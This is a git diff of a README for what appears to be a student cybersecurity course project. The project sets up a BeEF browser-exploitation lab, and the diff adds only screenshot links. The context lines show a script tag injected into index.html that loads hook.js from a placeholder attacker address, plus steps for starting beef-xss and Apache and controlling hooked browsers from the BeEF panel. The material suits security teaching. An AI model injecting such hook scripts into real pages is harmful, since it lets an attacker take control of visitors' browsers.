@@ -16,6 +16,9 @@ Cybersecurity course first project in KGM
 * vim index.html
 * within the body tag, insert <script>src="http://IP_ADDRESS:3000/hook.js"</script>
 
+![index_file](index_file.png)
+
+
 ### Start beEF and run apache
 * beef-xss
     * this will ask to set beEF password
@@ -24,5 +27,9 @@ Cybersecurity course first project in KGM
 * systemctl start apache2
 * systemctl status apache2
 
+![apache_server](apache_server.png)  
+
 * Go to IP_ADDRESS/ui/panel and login with beef as username and password as set during beef installation
 * Online hooks should be enabled. Click on IP_ADDRESS and perform actions
+
+![beef_screenshot](beef_screenshot.png)
